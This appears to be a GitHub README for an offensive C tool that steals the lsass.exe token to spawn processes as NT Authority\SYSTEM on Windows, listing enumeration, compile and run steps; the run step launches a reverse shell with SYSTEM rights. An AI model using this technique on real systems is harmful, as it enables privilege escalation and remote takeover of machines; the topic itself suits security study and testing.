# Impersonator

![Image](https://github.com/plackyhacker/impersonator/blob/main/Impersonator.gif)

Simple C code to impersonate the `lsass.exe` primary token and spawn a new process as `NT Authority\SYSTEM` . The `SeImpersonate` privilege is required to impersonate another process token.


**Enumerate**

```
C:\Target\>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
...
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
...
```


**Compile the code**

```
C:\Dev\>compile.bat
```


**Run the binary**

```
C:\Target\>impersonator.exe reverse_shell.exe
```
